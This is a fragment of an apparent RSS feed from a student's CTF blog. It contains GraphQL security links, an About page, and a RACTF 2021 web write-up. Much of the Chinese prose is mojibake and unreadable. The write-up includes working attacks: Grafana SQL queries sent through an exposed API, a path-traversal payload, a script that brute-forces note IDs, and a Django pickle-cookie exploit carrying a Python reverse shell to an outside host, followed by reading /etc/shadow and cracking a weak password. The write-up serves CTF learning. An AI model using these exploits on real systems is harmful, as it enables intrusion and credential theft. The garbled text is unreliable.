&lt;p>&lt;a href="https://www.freebuf.com/articles/web/184040.html">GraphQLå®‰å…¨æŒ‡åŒ—&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.shuzhiduo.com/A/RnJW3BRoJq/">UWP GraphQLæ•°æ®æŸ¥è¯¢çš„å®ç°&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://medium.com/@HurricaneJames/graphql-mutations-fb3ad5ae73c4">GraphQL Mutations&lt;/a>&lt;/p>
&lt;p>&lt;a href="http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/">GraphQL NoSQL Injection Through JSON Types&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://godot.win/2017/GraphQl/">GraphQL Injection&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/WoHEC50u7KACLLafZL5tww">ã€å®‰å…¨è®°å½•ã€‘ç©è½¬GraphQL - DVGAé¶åœºï¼ˆä¸Šï¼‰&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/mmJrE6uIBC-4ztr5PFZasA">ã€å®‰å…¨è®°å½•ã€‘ç©è½¬GraphQL - DVGAé¶åœºï¼ˆä¸‹ï¼‰&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://tsublogs.wordpress.com/2017/08/25/hitb-ctf-singapore-2017-web-512-blog/">[HITB CTF Singapore 2017]Blog&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://godot.win/2017/GraphQl/#SEC-T-2017-Dark-Market">[SECT 2017]Dark Market&lt;/a> | &lt;a href="https://github.com/reznok/CTFWriteUps/tree/master/SEC-T_2017/DarkMarket">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://swisskyrepo.github.io/HIP19-MeetYourDoctor/">[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3&lt;/a> | &lt;a href="https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.gem-love.com/ctf/2198.html">[VolgaCTF 2020]Library&lt;/a>&lt;/p>
&lt;/details>
&lt;hr>
&lt;p>å¼€å­¦äº†ï¼Œä¸æ‘†çƒ‚ä»æˆ‘åšèµ·&lt;/p></description></item><item><title>About</title><link>https://amiaaaz.github.io/about/</link><pubDate>Wed, 25 Aug 2021 01:39:57 +0800</pubDate><guid>https://amiaaaz.github.io/about/</guid><description>&lt;p>ä½ å¥½å‘€ï¾Ÿâˆ€ï¾Ÿ)ãƒ&lt;/p>
&lt;p>è¿™é‡Œæ˜¯è‘µå­ï¼Œä¸€ä¸ªä¿¡å®‰ä¸“ä¸šçš„æ™®é€šå¤§äºŒå­¦ç”Ÿ&lt;/p>
&lt;p>è¶…é«˜æ ¡çº§ç½‘ä¸Šå†²æµªçˆ±å¥½è€…ï¼Œå–œæ¬¢çœ‹ä¹¦ï¼Œå¬æ­Œ&lt;del>å’Œæ€è€ƒäººç”Ÿ&lt;/del>ï¼Œå–œæ¬¢æ‰“éŸ³æ¸¸å’Œä¸€äº›å•æœºæ¸¸æˆï¼Œè¿åŠ¨ç»†èƒä¸º0&lt;/p>
&lt;p>ctf webæ–¹å‘çš„çœ‹é¢˜é€‰æ‰‹ï¼ˆåˆ«é—®ä¸ºä»€ä¹ˆåªæ˜¯çœ‹é¢˜ é—®å°±æ˜¯ç­¾åˆ°é¢˜éƒ½ä¸ä¼šï¼‰ï¼Œä¸è¿‡äººèœç˜¾å¤§ï¼Œæ—¥å¸¸çç¢ç£¨ï¼Œçç ”ç©¶ï¼›å…´è¶£é©±åŠ¨å‹ï¼Œæœ‰ä¸€é¢—æƒ³æˆä¸ºå…¨æ ˆçš„å¿ƒï¼ˆæ¢¦æƒ³è¿˜æ˜¯è¦æœ‰çš„ï¼Œæ—¥æ‹±ä¸€å’ï¼Œè¯´ä¸å®šå°±å®ç°äº†&lt;/p>
&lt;p>åœ¨åŠªåŠ›è®©è‡ªå·±çœ‹èµ·æ¥ä¸é‚£ä¹ˆèœï¼Œè¿›åº¦0/nï¼ˆå·²ç»è„±ç¦»è´Ÿæ•°äº†ï¼å¥½æ¶ˆæ¯ï¼‰&lt;/p>
&lt;p>è‡´åŠ›äºç‚¹å‡ºä¸€æ£µèŒ‚ç››ã€æµ“å¯†çš„æŠ€èƒ½æ ‘ã€‚æ—¢ç„¶â€œä»¥æœ‰æ¶¯éšæ— æ¶¯â€ä¼š&lt;code>die();&lt;/code>ï¼Œé‚£å°±è®¾å¥½æ–­ç‚¹ï¼Œåœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­æ…¢æ…¢debugï¼Œè¯´ä¸å®šå°±Bypassäº†å‘¢ï¼Ÿ&lt;/p>
&lt;p>è¿™ä¸ªå°å°çš„åšå®¢ä¼šåŒ…å«ä¸€äº›ç²—ç³™ä½†è´¨æœ´çš„ç¬”è®°å’Œç²¾è‡´ä¸”åŒæ ·ç”¨å¿ƒçš„wpï¼Œè¿˜ä¼šæœ‰ä¸€äº›ä¿¡æ‰‹å†™å°±çš„æ–‡å­—ï¼Œäº21å¹´7æœˆåº•å¼€å¼ ã€‚&lt;/p>
&lt;p>è™½ç„¶ç°åœ¨åªæœ‰ä¸€äº›å«æ°´é‡å¾ˆé«˜ã€æŠ€æœ¯åŠ›å¾ˆä½çš„äº’è”ç½‘å¹²åƒåœ¾ï¼Œä½†æœªæ¥è¿™é‡Œä¸€å®šä¼šæœ‰è‡ªå·±çš„åŸåˆ›äº§å‡ºï¼›è™½ç„¶ç°åœ¨å°ç«™é—¨å¯ç½—é›€ï¼Œä½†å¸Œæœ›æœ‰ä¸€å¤©å¯ä»¥ä¸ºæ›´å¤šçš„äººå¸¦æ¥å¸®åŠ©ï¼›å¸Œæœ›åœ¨å­¦å®‰å…¨çš„é“è·¯ä¸Šä¸€ç›´èµ°ä¸‹å»&lt;/p>
&lt;p>stay hungry, stay foolish.&lt;/p>
&lt;hr>
&lt;blockquote>
&lt;p>&lt;em>I wanna be defined by the things that I love&lt;/em>&lt;/p>
&lt;p>&lt;em>Not the things I hate&lt;/em>&lt;/p>
&lt;p>&lt;em>Not the things I&amp;rsquo;m afraid of, I&amp;rsquo;m afraid of&lt;/em>&lt;/p>
&lt;p>&lt;em>Or the things that haunt me in the middle of the night&lt;/em>&lt;/p>
&lt;p>&lt;em>I, I just think that&lt;/em>&lt;/p>
&lt;p>&lt;em>&lt;strong>You are what you love&lt;/strong>&lt;/em>&lt;/p>
&lt;/blockquote></description></item><item><title>RACTF2021 Wp</title><link>https://amiaaaz.github.io/2021/08/18/ractf2021-wp/</link><pubDate>Wed, 18 Aug 2021 17:07:55 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/18/ractf2021-wp/</guid><description>&lt;p>&lt;a href="https://2021.ractf.co.uk/">https://2021.ractf.co.uk/&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/ractf/challenges/tree/master/2021">https://github.com/ractf/challenges/tree/master/2021&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/404dcd/RACTF-challenges">https://github.com/404dcd/RACTF-challenges&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.ractf.co.uk/tag/ractf-2021/">https://blog.ractf.co.uk/tag/ractf-2021/&lt;/a>&lt;/p>
&lt;h2 id="webreally-awesome-monitoring-dashboard">Web/Really Awesome Monitoring Dashboard&lt;/h2>
&lt;blockquote>
&lt;p>ğŸŒŸ Perfect infrastructure ğŸŒŸ&lt;/p>
&lt;/blockquote>
&lt;p>æ˜¯grafana&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818005221430.png" alt="image-20210818005221430">&lt;/p>
&lt;p>ä½†æ˜¯ç‰ˆæœ¬ä¹Ÿå¤ªæ–°äº†å§8.1.1ï¼Œå¼±å£ä»¤ä¹Ÿæ²¡æœ‰ï¼ŒæŠ“åŒ…å¯ä»¥çœ‹åˆ°å®ƒåœ¨ä¸åœçš„è¯·æ±‚å„ç§apiï¼Œå…¶ä¸­æœ‰ä¸ª/api/ds/queryï¼Œä»¥æ˜æ–‡æ–¹å¼è¯·æ±‚æ•°æ®åº“å†…å®¹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818005705121.png" alt="image-20210818005705121">&lt;/p>
&lt;p>é‚£è¿™å°±å¥½è¯´äº†ï¼Œç›´æ¥æ˜ç‰Œäº†éƒ½&lt;/p>
&lt;pre tabindex="0">&lt;code>SELECT name FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%';
SELECT * FROM flags;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818011913101.png" alt="image-20210818011913101">&lt;/p>
&lt;p>â€”â€”â€”â€”è¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬å¯¹äºæƒé™çš„è®¾ç½®æ˜¯å¾ˆé‡è¦çš„ï¼Œä¸è¦éšä¾¿æŠŠapiæ¥å£æš´éœ²å‡ºæ¥ï¼Œä¹Ÿä¸è¦æ˜æ–‡ä¼ é€’ä¿¡æ¯&lt;/p>
&lt;h2 id="webreally-awesome-hidden-service">Web/Really Awesome Hidden Service&lt;/h2>
&lt;blockquote>
&lt;p>Ahoy, matey! Some dirty scallywags seem to not be respectin' th' pirate code! Teach them a lesson by findin' out who they be.&lt;/p>
&lt;pre tabindex="0">&lt;code>ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion
&lt;/code>&lt;/pre>&lt;/blockquote>
&lt;p>ä¸€ä¸ªTorçš„ç½‘ç«™ï¼Œèµ°åŒ¿åæ–¹å¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818014430572.png" alt="image-20210818014430572">&lt;/p>
&lt;p>é‚£é¦–å…ˆè¦æŠŠéšè—åœ¨åé¢çš„çœŸå®ipç»™æ‰¾å‡ºæ¥ã€‚æ•´ä¸ªç½‘é¡µçš„å†…å®¹æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„ï¼Œä½†æ˜¯é€šå¸¸å®¹æ˜“è¢«å¿½ç•¥çš„æ˜¯faviconå›¾åƒï¼Œè¿™é‡Œå¯ä»¥å‚è€ƒè¿™æ ·ä¸€ç¯‡æ–‡ç« ï¼š&lt;a href="https://isc.sans.edu/forums/diary/Hunting+phishing+websites+with+favicon+hashes/27326/">Hunting phishing websites with favicon hashes&lt;/a>&lt;/p>
&lt;p>è¿™é‡Œå¯ä»¥ç”¨&lt;a href="https://github.com/pielco11/fav-up">fav-up&lt;/a>ä¸€æŠŠæ¢­ï¼ˆä¹Ÿå°±æ˜¯è‡ªåŠ¨åŒ–äº†æå–å›¾æ ‡-&amp;gt;è®¡ç®—mmhashå€¼-&amp;gt;shodanæœç´¢å‡ºipè¿™ä¸ªè¿‡ç¨‹ï¼‰ï¼Œå¾—åˆ°ipä¸º&lt;code>178.62.4.214|178.62.15.164&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818021746841.png" alt="image-20210818021746841">&lt;/p>
&lt;p>&lt;code>ractf{DreadingPirates}&lt;/code>&lt;/p>
&lt;p>â€”â€”â€”â€”é™¤æ­¤ä¹‹å¤–è¿˜æœ‰ä¸€ä¸ªéé¢„æœŸè§£ï¼Œå½“ç”¨éæ³•çš„host headerè¯·æ±‚æ—¶ï¼Œä¼šç›´æ¥è¿”å›flag&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -s --socks5-hostname localhost:9050 -H &lt;span style="color:#d88200">&amp;#34;Host: asd.com&amp;#34;&lt;/span> ractfysfo3ncuhk5nwzou5mpwmwqrc6ll6ubogd4eotvuhrbr4hcpsid.onion &lt;span style="color:#111">|&lt;/span> grep &lt;span style="color:#d88200">&amp;#34;ractf&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;em>All you need to do is send the server an invalid host header, which will cause it to fail back to its default vhost which reveals the flag. In retrospect, the solution to this would have been to make the flag only visible on a specific vhost, rather than the default.&lt;/em>&lt;/p>
&lt;h2 id="webemojibook">Web/Emojibook&lt;/h2>
&lt;blockquote>
&lt;p>&lt;img src="https://b.thumbs.redditmedia.com/4z_KB1qtCsTjcUqxDTbVIpJlR-AMzqrPeZDIz7VKdko.png" alt="img">&lt;/p>
&lt;p>The flag is at &lt;code>/flag.txt&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>å¯ä»¥ç™»å½•ã€æ³¨å†Œè´¦æˆ·ã€å‘å¸ƒnoteã€æŸ¥çœ‹ï¼Œç»™å‡ºäº†æºç &lt;/p>
&lt;p>çœ‹æºç ï¼Œæ˜¯djangoæ¡†æ¶çš„åç«¯ï¼Œç›´å¥”settings.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210815135148402.png" alt="image-20210815135148402">&lt;/p>
&lt;p>çœ‹åˆ°äº†ç†Ÿæ‚‰çš„pickle&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210815145254055.png" alt="image-20210815145254055">&lt;/p>
&lt;p>åœ¨ä»…æœ‰çš„è¿™ä¸ªappçš„view.pyä¸­æœ‰è¿™æ ·çš„ä»£ç ï¼Œä¼šåœ¨noteçš„bodyéƒ¨åˆ†åŒ¹é…&lt;code>{{.*?}}&lt;/code>è¿™æ ·çš„å†…å®¹å¹¶å°†å…¶ä¸­çš„éƒ¨åˆ†æ‹¼æ¥åˆ°/emoji/åä»¥imageçš„å½¢å¼åŠ è½½å‡ºæ¥ï¼Œä½†æ˜¯ç›´æ¥ç”¨{{/flag.txt}}æ˜¯ä¸å¯ä»¥çš„ï¼Œè¿™éƒ¨åˆ†ä»£ç åœ¨forms.pyä¸­&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818031453613.png" alt="image-20210818031453613">&lt;/p>
&lt;p>æ‰€ä»¥æœ€ç»ˆçš„payloadæ˜¯ &lt;code>{..{/flag.txt}..}&lt;/code>&lt;/p>
&lt;p>&lt;code>ractf{dj4ng0_lfi}&lt;/code>&lt;/p>
&lt;p>â€”â€”â€”â€”ç„¶è€Œè¿™é‡Œæœ‰ä¸ªéé¢„æœŸï¼Œurléƒ¨åˆ†å¯ä»¥ç›´æ¥ä¿®æ”¹noteç¼–å·è¾¾åˆ°æ°´å¹³è¶Šæƒï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥é€šè¿‡çˆ†ç ´æ–¹å¼æ‰¾åˆ°ä¹‹å‰å·²ç»æˆåŠŸçš„note&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">logging&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">threading&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">time&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">thread_function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://193.57.159.27:30160/&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;base64&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#34;cmFjdGZ7&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">pass&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">threads&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">index&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">threading&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">target&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">thread_function&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;span style="color:#111">threads&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">start&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">thread&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">enumerate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">threads&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">thread&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webemojybook-2">Web/Emojybook 2&lt;/h2>
&lt;blockquote>
&lt;p>no unintended solution this time! the source has not been patched, the unintended solution was caused by my dockerfile&lt;/p>
&lt;p>The flag is at &lt;code>/flag.txt&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>è·Ÿä¸Šé¢é‚£ä¸ªå‰ç«¯ä¸€æ¨¡ä¸€æ ·ï¼Œç„¶è€Œè¿™æ¬¡å†ç”¨ä¹‹å‰çš„ &lt;code>{..{/flag.txt}..}&lt;/code>ä¼šè¿”å›500é”™è¯¯ï¼Œè¿™å›å°±è¦ç”¨ä¸Šä¹‹å‰å®Œå…¨æ²¡ç”¨åˆ°çš„pickle session cookieäº†ã€‚&lt;/p>
&lt;p>å…ˆè¯»ä¸€ä¸‹/app/notebook/settings.pyï¼Œå¾—åˆ°secret_keyï¼Œç„¶åæä¸€ä¸ªåå¼¹shellçš„cookieå‡ºæ¥&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e"># Modified from https://blog.scrt.ch/2018/08/24/remote-code-execution-on-a-facebook-server/&lt;/span>
&lt;span style="color:#75715e">#!/usr/bin/python&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">django.core.signing&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">django.contrib.sessions.serializers&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">django.http&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">HttpResponse&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">django.conf&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">settings&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#111">SECRET_KEY&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;wr`BQcZHs4~}EyU(m]`F_SL^BjnkH7&amp;#34;(S3xv,{sp)Xaqg?2pj2=hFCgN&amp;#34;CR&amp;#34;UPn4&amp;#39;&lt;/span>
&lt;span style="color:#111">settings&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">configure&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">DEFAULT_HASHING_ALGORITHM&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;sha256&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># Initial cookie when visiting the page&lt;/span>
&lt;span style="color:#111">cookie&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;.eJxNjEEKwjAQRUVwKYKn0E1Impmm3Yl7z1AmSWNbJYW2WQoeIMt4D4-ookL_8r3Hv68ez8V3t7SL64rC1FRhrIeqtSkuS0xxO4OazKX2b7O3Hflzz0zvp6HV7JOwnx3Zqbf19fhvN7ODhsYmxQOQyMjmSIpzLjMCYyRpDTlwI5wAaTNwFhWgwVISaVWgUKiVcM4V4FJgLxnJP1s:1mFhOG:5yO4Fkp6kQCGyt6e5jHf6Gn5V6gqPDWIw21OTFSw8DM&amp;#34;&lt;/span>
&lt;span style="color:#111">newContent&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">django&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">core&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">signing&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cookie&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">serializer&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">django&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">contrib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sessions&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">serializers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PickleSerializer&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">salt&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;django.contrib.sessions.backends.signed_cookies&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PickleRce&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">object&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">__reduce__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">,(&lt;/span>&lt;span style="color:#d88200">&amp;#34;python -c &amp;#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">VPS IP&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">,4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">/bin/sh&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,))&lt;/span>
&lt;span style="color:#111">newContent&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;testcookie&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">PickleRce&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">new_cookie&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">django&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">core&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">signing&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">newContent&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">serializer&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">django&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">contrib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sessions&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">serializers&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PickleSerializer&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">salt&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;django.contrib.sessions.backends.signed_cookies&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">compress&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># We can then make a request with this cookie&lt;/span>
&lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://193.57.159.27:23934/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">cookies&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;sessionid&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">new_cookie&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¾—åˆ°shellä¹‹åæˆ‘ä»¬åªæ˜¯ä¸ªwebç”¨æˆ·ï¼Œè¯»/etc/shadowå¯ä»¥iå¾—åˆ°adminçš„hashå€¼ï¼Œå¼±å£ä»¤ æ˜¯ä¸ª999999ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥&lt;code>su admin&lt;/code>ï¼Œè¯»flagäº†&lt;/p>
